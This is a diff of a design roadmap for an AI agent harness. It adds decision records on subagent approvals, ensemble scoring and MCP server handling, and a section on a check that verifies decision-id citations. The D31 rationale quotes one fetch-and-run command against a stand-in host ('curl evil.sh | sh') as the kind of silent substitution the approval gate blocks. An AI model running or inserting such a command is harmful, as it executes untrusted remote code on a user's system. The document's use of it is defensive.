@@ -61,6 +61,71 @@ Every decision below was made through a structured clarification cycle with the 
 | D30 | **(Rev. 4)** `mcp.json` validation is by connection, not by schema | Unrecognized keys are accepted and ignored (DEBUG-logged); a server is validated by connecting and calling `list_tools()`; per-server failures are named and skipped, never fatal | `settings.json` raises on unknown keys (§14 amendment 1) because every one of its keys changes behavior. `mcp.json` is routinely shared with Claude Desktop, Cursor and others, which carry keys this harness doesn't implement — failing startup over a decorative key is worse than ignoring it. What we can't understand about *what executes* still surfaces, as that server's connect failure. One stale entry must never make the harness unusable. |
 | D31 | **(Rev. 4)** User-level MCP servers are acknowledged once | First time a user-level server is seen, show the command it will run and confirm; store name → hash of its config entry, so an edited command re-asks | Project-level servers are covered by D17. User-level ones had no gate at all, on the assumption you authored them — which is exactly wrong when an installer or another tool appended to the file. Content-hash keying is D17's pattern reused, so an acknowledgement of `npx pkg` can't silently carry over to `curl evil.sh \| sh` under the same name. |
 
+### Decisions record — S1–S4 (the §14–§18 review's fix pass)
+
+The §14–§18 review found 65 issues; four of its fixes needed a decision rather
+than a correction. They are cited from `agents/`, `mcp_client/` and `core/`, and
+they amend §18 and §17 rather than belonging to a section of their own — which is
+why they sit here with `D1`–`D31` instead of under a section heading.
+`DEVLOG.md`'s §14–§18 review pass records the same four in narrative form.
+
+| # | Decision |
+|---|---|
+| **S1** | **Subagent sign-off, all-or-nothing, per turn.** Approving a spawn authorises the child's whole approval-gated set for the rest of the turn. Per-tool selection is deferred to §23's response channel and recorded there as a named consumer. |
+| **S2** | **The parent's approval tightenings union into the child.** Only `True` entries carry, since a `False` is indistinguishable from absent under D14's OR — so unioning can only tighten. **This amends §18's locked sketch**, which shows `approval_overrides=agent_def.approval_overrides` verbatim; C6 reasoned about `allowed_tools` and never considered the approval axis. |
+| **S3** | **MCP teardown by exact name, not by prefix.** `mcp__<server>__<tool>` cannot be taken apart again — neither `__` in a server name nor in a tool name is illegal. Registration records what it registered. No `mcp.json` content is rejected up front, so decision G stands. |
+| **S4** | **One central effort validator, cached.** A network call at startup is acceptable; on lookup failure the requested level passes through unverified with a WARNING rather than being dropped, and the failure is not cached. |
+
+**Do not confuse these with the audit's severity grades.** Findings in Audit
+Pass 1 are graded `S1` (worst) to `S4`, and `ROADMAP_v2.md` cites those grades in
+§30–§35. A bare `S1` in a section written *about* the audit is a severity; a bare
+`S1` anywhere else is the decision above. See the namespace list in `AGENTS.md`.
+
+### Decisions record — E1–E12 (ensemble mode, ROADMAP.md §10's revisit)
+
+Ensemble mode is §10's subject and its revisit note lives in `ROADMAP.md`, but its
+decisions are cited from `config.py` and four files under `core/reasoning/`, so
+they belong in the record with everything else rather than in a note about a note.
+
+| # | Decision |
+|---|---|
+| E1 | Diversity from different MODELS. `config.ENSEMBLE_MODELS`, entries `{provider_name, model}`. Deviates from §10's own note; see above. |
+| E2 | `config.py` only, following `CRITIC_MODEL`. `ensemble_models` is rejected from `settings.json` **by name** — R12's rule applied to a second kind of authority. Turning the mode on can only spend more of the provider the user already chose; a *roster* chooses providers, and a project's `settings.json` beats the user's. §14 already flagged project-tier provider selection as its own grant; this is that grant times N. |
+| E3 | N is `len(ENSEMBLE_MODELS)`, derived. A separately configured count could disagree with the roster that produced the candidates, and a confidence score's denominator must not be able to lie. |
+| E4 | `ensemble_n` stays a known settings key and a pipeline parameter, vestigial, with a WARNING when set. Removing the key would make every existing `settings.json` that sets it **raise** — unknown keys raise by design. |
+| E5 | Refuse on fewer than 2 **distinct** `(provider, model)` pairs. The load-bearing guard: `[X, X, X]` recreates §16's exact defect through the new config. |
+| E6 | API keys are not pre-validated; validation is by connecting. Matches §16's `/model` (warns on an empty `API_KEY` so a local endpoint stays usable) and MCP's per-server posture. |
+| E7 | A failed candidate is named, traced and skipped; the denominator is the number that produced text. One survivor **degrades to the single-candidate path** rather than being scored as an ensemble of one, which would report unanimous corroboration from a single source. All candidates failing is an error. |
+| E8 | Consistency enters as a **disagreement penalty**: `raw -= 0.15 * (1 - consistency)`, factual claims only, subtracted like `ASSUMPTION_FLAG_PENALTY`. Unanimity is free, dissent subtracts. |
+| E9 | Non-factual claims untouched. §10 decided consistency does not *rescue* them from the cap; whether dissent should *penalise* a speculative claim is a different judgment and was never made. |
+| E10 | `score_claim` rounds once, then uses that value for both the tier and the breakdown. |
+| E11 | Candidate labels follow the **survivors**, never roster position. |
+| E12 | No new `Claim` field, no new `PipelineRun` field, no schema change. The denominator goes in the existing `score_breakdown` (§20's precedent, which put tier overrides there to avoid migrating every `vars(c)` site); the roster goes in `run.trace`. |
+
+### Decisions record — C1–C10 (Revision 1's review conflicts)
+
+Revision 1 was reviewed against Revision 2 and the conflicts were numbered. The
+resolutions shipped and are cited as authority in `ROADMAP_v2.md` section
+headings ("fixes C6, locked in"), in `ARCHITECTURE.md`, in
+`tests/BREAKING_CHANGES.md`, and in **six production files** — but the list
+itself was never copied into any document. Recovered here from the citing lines,
+found by audit #147. Only the five with live citations are recovered; the gaps in
+the numbering are conflicts that were resolved without leaving a reference.
+
+| # | Decision |
+|---|---|
+| **C1** | **The permission prompt is bridged, not inlined.** Rev. 1 had the TUI unable to render an approval prompt from inside the loop. `_run()` is already a generator yielding `LoopEvent` and `permission_channel` already exists, so the app consumes the generator on a worker and answers through the queue — no new loop machinery. §16. |
+| **C3** | **A subagent's depth is carried on the `ToolContext`, not passed as a parameter.** Rev. 1's `spawn_subagent` took `depth: int = 0`, which `registry.dispatch()` could never populate — dispatch passes only `params`, parsed from the model's tool call, so no incremented depth could ever reach a nested call. `subagent_depth` rides on the context and `spawn_subagent` increments it when it builds the child. Checked against `config.SUBAGENT_MAX_DEPTH`. §18. |
+| **C6** | **Intersection, never union.** A subagent's effective `allowed_tools` is the intersection of its own declaration and its parent's currently-active set. Without this, a restricted parent could spawn a permissively-declared child specifically to escape its own restriction — privilege escalation one hop removed, undermining §15's "stricter wins". **Amended by S2** for the approval axis, which C6 never considered. §18. |
+| **C8** | **`run_to_completion()` lives in `core/loop.py`, not its own module.** It is coupled to `_run()`'s exact generator shape, and a separate module risked a circular import for no benefit. (Settles Rev. 1's open question S16 — a different S namespace; see `AGENTS.md`.) §13. |
+| **C10** | **`MCPClient.__init__` stores `server_configs`.** Rev. 1's constructor never did, so every later method that needed it failed. A real bug rather than a design conflict; kept in this list because it is cited by number from `mcp_client/client.py` and pinned by a regression test. §17. |
+
+**A fourth namespace uses this prefix.** The research pipeline's claim ids are
+`C1`, `C2`, `C3`… (`{"C1": [...]}` in a Pass 5 payload, and the id shapes
+`test_json_retry` asserts). Those are run data, not decisions; they appear in
+`ROADMAP_v2.md` §26 and in `tests/BREAKING_CHANGES.md` as example payloads. See
+the namespace list in `AGENTS.md`.
+
 ---
 
 ## Index
@@ -87,6 +152,7 @@ Every decision below was made through a structured clarification cycle with the 
 - **§32. The catalogs — what the model is told it can do, and who gets to write it** — BUILT (#68, #131, #69, #70, #71, #72; closes unit 8)
 - **§33. The call boundary — the one file every model call goes through** — BUILT (#37, #38, #39, #135; closes unit 3)
 - **§34. /init's vocabulary — four lists for one question** — BUILT (#96, #94, #95, #98; closes unit 12)
+- **§35. The record's index — the decisions, and whether they can be found** — BUILT (#16, #17, #147, #91; closes unit X5)
 - **Open Questions — None Remaining** (Rev. 3 — all decisions locked; verification items only)
 - **Why these calls, not just what they are** (Rev. 3 — the reasoning patterns behind several decisions above)
 
@@ -1800,7 +1866,7 @@ defect is that `ConversationThread` has no field saying what a thread *is*, so
 
 ## 28. The shell capability classifier — one classification, two consumers — BUILT
 
-**Problem (audit #157, S1).** `shell`'s approval check documented a five-layer policy. Four of those
+**Problem (audit #157, severity S1).** `shell`'s approval check documented a five-layer policy. Four of those
 layers could only ever return `False` on the shipped config flags, so the whole thing was a
 pass-through for one boolean. Measured, with `ToolApprovals.shell = False`:
 
@@ -1903,7 +1969,7 @@ now would be speculative).
 
 ## 29. The CLI shell — one reader, one channel, one entry point — BUILT
 
-**Problem (audit #100, S1).** `_StdinReader`'s docstring names the hazard, for the case it fixed:
+**Problem (audit #100, severity S1).** `_StdinReader`'s docstring names the hazard, for the case it fixed:
 
 > `input()` cannot be interrupted, and **spawning a reader per prompt would leave several threads
 > racing for the same stdin** after the first timeout — whichever won would answer the wrong question.
@@ -2009,7 +2075,7 @@ N2, the four run-backed prompts: byte-identical (diff of the rendered strings is
 
 ## 30. The pipeline's payload boundary — one shape check for the ten passes — BUILT
 
-**Problem (audit #76, S1).** §3's retry corrects a response that does not **parse**. Nothing checked
+**Problem (audit #76, severity S1).** §3's retry corrects a response that does not **parse**. Nothing checked
 that what parsed was the **shape** the pass promised, so the same defect appeared in six places at
 once, and two of them completed a run and reported a false outcome.
 
@@ -2105,7 +2171,7 @@ harness exists to separate.
 
 ### Deliberately not in §30
 
-- **#57**, the tool wall clock — the last S1 after this. `signal.alarm` is main-thread-only, the TUI
+- **#57**, the tool wall clock — the last severity-S1 finding after this. `signal.alarm` is main-thread-only, the TUI
   runs tools in a worker, and abandoning a thread mid-`sympy` leaks one nothing can join. That is a
   decision about process isolation, and its fix site is on every tool call in the project.
 - **#77**, keeping the ensemble candidates on `PipelineRun`. B8's recorded clamp is a partial answer
@@ -2121,7 +2187,7 @@ harness exists to separate.
 
 ## 31. What a tool call is allowed to cost — one declared bound per tool — BUILT
 
-**Problem (audit #57, S1 — the last S1 in the project).** `registry.dispatch` was
+**Problem (audit #57, severity S1 — the last one in the project).** `registry.dispatch` was
 `result = spec.handler(params, **injected)`. No timeout, no alarm, no signal machinery anywhere
 between the model and the handler, and the arguments come from the model.
 
@@ -2755,6 +2821,134 @@ to match ordinary prose and it would apply to every tool result in the harness.
 **#94's fuller ambition** — a `_DOC_EXTENSIONS`/`_DOC_FILENAMES` pair derived from the manifest
 table itself. The two now agree by one calling the other, which is the property that was missing;
 merging them would also merge a security boundary with a discovery heuristic.
+
+## 35. The record's index — the decisions, and whether they can be found — BUILT
+
+**Three findings, one defect, and it is the defect this project is most exposed to.** The whole
+reason the harness can be audited for *"does the code still follow our design choices"* is that the
+choices have stable ids. `AGENTS.md` says so: *"Section and D-numbers are stable and
+cross-referenced everywhere."* Three issues had each filed one way that sentence was false:
+
+| | filed as | measured on `3b99ac0` |
+|---|---|---|
+| **#16** (severity S2) | four decisions (S2, S3, E4, E6) live only in `DEVLOG` | **sixteen** — *all* of `S1–S4` and *all* of `E1–E12`, and the map never named `E` at all |
+| **#17** (severity S2) | two prefixes carry two numbering schemes each | **`S` carries three**, and `AC` — which #17 never mentions — is section-scoped and was cited **unqualified 24 times in production**, where `AC6` alone meant three different criteria in three files |
+| **#147** (severity S3) | the `C` family is cited as authority in six production files and defined nowhere | confirmed; and `C1`'s one lookupable definition answers a different question |
+| **#91** item 2 (severity S3) | `effective_compaction` promises provenance it does not return | confirmed; #91's other three items were already fixed by earlier batches |
+
+#147 is the one that set the shape: *"All three are the same defect at the level of the record's
+index, which is the argument for **one mechanical check** over all of them rather than three prose
+fixes."* Prose fixes are what drifted in the first place.
+
+### Design Decisions Record — §35 (Y1–Y5)
+
+| id | decision |
+|---|---|
+| **Y1** | **The `S` and `E` tables move into the record.** `AGENTS.md` says the ROADMAPs carry it, and the fix is to make that true rather than to qualify the sentence. `DEVLOG` keeps each heading with a one-line summary and a pointer, so its per-section narrative still says a decision was taken there |
+| **Y2** | **The check quantifies over both sides — what the record defines and what the code cites.** Map-side alone would have found none of `AC`, `D0`, `P10` or `S12`, because those are cited in code and never claimed by the map |
+| **Y3** | **Declare the namespaces; qualify the citations; renumber nothing.** #147's own argument — the ids are in six production files, so changing them costs more than defining them. #17's suggested `Q11/Q12/Q16` also collides with `DEVLOG`'s existing `Q1–Q7` |
+| **Y4** | **#91 item 2 is a docstring correction and a promoted deferral, not a build.** Provenance means rewriting the merge, not adding a field, and D27's display surface does not exist |
+| **Y5** | **The new family letter is `Y`, not `O`.** `O1` and `01` are one glyph apart in every monospace font these documents are read in, which is the batch's own failure mode. Free after this: `O` |
+
+### The check, and why it is a grammar rather than a list
+
+An id in a production comment or docstring must either **resolve in the record** or **say which
+other namespace it belongs to**. Six namespaces share the `LETTER+NUMBER` shape:
+
+| namespace | ids | written as |
+|---|---|---|
+| design decisions | ~200, twenty families | bare |
+| pipeline gates | `D0`, `D1`, `D2` | `gate D0` |
+| acceptance criteria | `AC1`… | `§21 AC6` — section-scoped |
+| Rev. 1 open questions | `S11`, `S12`, `S16` | `Rev. 1 S12` |
+| audit severities | `S1`–`S4` | `severity S1` |
+| review findings / mutations | `F2`, `P10` | `review finding F2`, `mutation P10` |
+
+A **qualifier grammar** rather than a list of blessed ids, because a list only covers the citations
+that already exist. That is the property #148 identifies as separating this project's two guards
+that worked — **D24** (a raise over every registered tool, covering a tool nobody has written) and
+**J4** (a decoder parametrised over `SAFE_DEFAULTS`, covering a kind nobody has added) — from the
+warning comments that did not. #148's recommendation, verbatim: *"when an instance number reaches
+three, the next decision should name the domain the rule quantifies over."* Three is where #16,
+#17 and #147 had got to.
+
+`D1` and `D2` are the pair nothing can force: both a decision and a gate, so both resolve and the
+check cannot tell which was meant. Written down rather than papered over.
+
+### What the batch moved
+
+```
+                                                         before        after
+decision families with no definition in the record       5             2   (AC and F, both
+                                                                            declared namespaces)
+  ids in them                                            27            10
+ids the map claims that the record does not hold         4  (S1-S4)    0
+families the record defines that the map does not name   1  (E)        0
+ids cited in production prose that resolve to nothing    26 distinct   0
+  citations                                              83            0
+AC citations that name their section                     29 of 53      53 of 53
+meanings the prefix S carries                            3             2
+```
+
+### Two things the pass changed about the check itself
+
+**The definition scanner has to know three shapes.** The record writes a decision as a plain table
+row (`| D1 | ... |`), a bolded table row (`| **U1** | ... |`), or a bolded lead with the dash
+*inside* the bold (`**M1 — ...**`). A scanner that knows only the first reports the entire `M`
+family — 21 ids — as undefined. This batch's own first census did exactly that, and the count was
+wrong by 21 before anyone noticed. `test_the_definition_scanner_sees_every_shape_the_record_uses`
+pins one id per shape by name.
+
+**The `AC` qualifier is line-scoped, not adjacent.** `§23 (AC1)` and `§27 T2 / AC6` are already
+unambiguous to a reader, so requiring the section immediately before the id would have meant
+rewriting correct prose. What it does require is that the section appear *somewhere earlier on the
+same line*, which `(D23, AC6)` did not.
+
+### The mutation pass, and the survivor that mattered
+
+**23 mutations, three survivors on the first run, all three in the check rather than in the
+documents.** Final: **23 of 23 RED**, from a control green on the unit file and on the full suite.
+
+| survivor | why nothing caught it |
+|---|---|
+| `citation-scan-looks-at-comments-only` | **The narrow-the-domain mutation.** A scan that reads less finds nothing wrong, and finding nothing wrong is exactly what passing looks like. Dropping the docstring branch left every check green while the place most citations live stopped being read |
+| `citation-scan-skips-the-hyphen-guard` | The guard's stated reason had gone **stale underneath it** — written for `[a-zA-Z0-9]` in a regex literal, obsolete once the scan stopped reading code. Measured, it still changes two lines, both range citations, and the case it is really for is a range over a *sparse* family: `C1–C10` would report five decisions that never existed |
+| `grammar-a-qualifier-may-sit-anywhere-on-the-line` | No test had the qualifying word earlier in the sentence but not adjacent to the id |
+
+The first is the same shape as batch 14's two survivors and worth naming as a class: **a check
+whose passing condition is "found nothing" cannot detect that it looked in fewer places.** The
+answer is to pin the domain in both directions — a citation that must be seen, and a runtime string
+that must not.
+
+The check also caught **this batch's own omission** on its first run: slice 3 added the `C` family
+to the record and did not add it to the map.
+
+### Not qualified, deliberately
+
+Two `D0` sites are the pipeline's **data**: the stage name in `events.py`'s tuple and in
+`_stage("D0")`. The trace lines are keyed by them and
+`test_pipeline_trace_contains_expected_lines_in_order` matches on the `D0:` prefix. Found by making
+the change and reading the failure, which is also how the comments-vs-values boundary got drawn
+rather than guessed.
+
+### Verification
+
+- **Windows: 2,145 passed / 18 skipped / 1 deselected.**
+- **`python:3.11-slim`, the CI configuration: 2,161 passed / 2 skipped / 1 deselected**, run
+  on the final tree before the branch went anywhere — the fifth
+  batch to honour §31's correction. It matters here: the check walks the filesystem and reads
+  mixed-EOL documents, and one of its two failing-before tests names paths.
+- **The check demonstrated RED on the branch point**, not merely green after: **two of its seven
+  tests fail on `3b99ac0`**, the citation one listing all 26 ids. The other five are
+  self-contained pins on the check's own scanner and grammar, so they pass on either tree by
+  design -- which is the point of them.
+- **23 of 23 mutations RED.**
+
+### Closed with this section
+
+**Unit X5 (#148)** — its two findings are #146 (fixed earlier) and #147. **#16 and #17** belong to
+the master tracker #15 rather than to a unit. **#91** closes with unit 11 still holding #89, #90
+and #92.
 
 ## Open Questions — None Remaining
 
